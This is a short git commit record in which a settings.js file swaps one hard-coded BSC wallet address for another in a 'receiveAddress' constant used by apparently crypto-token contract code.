db6ced18134372a2f47c73892d62f49ed42b2d5a
Hanzo419941 <166773372+Hanzo419941@users.noreply.github.com>
2024-04-12 08:43:29 +0000

    Update settings.js
    Exza

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x7c3a6016685abFF3264d3eEC82E8929bcD3f644c";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
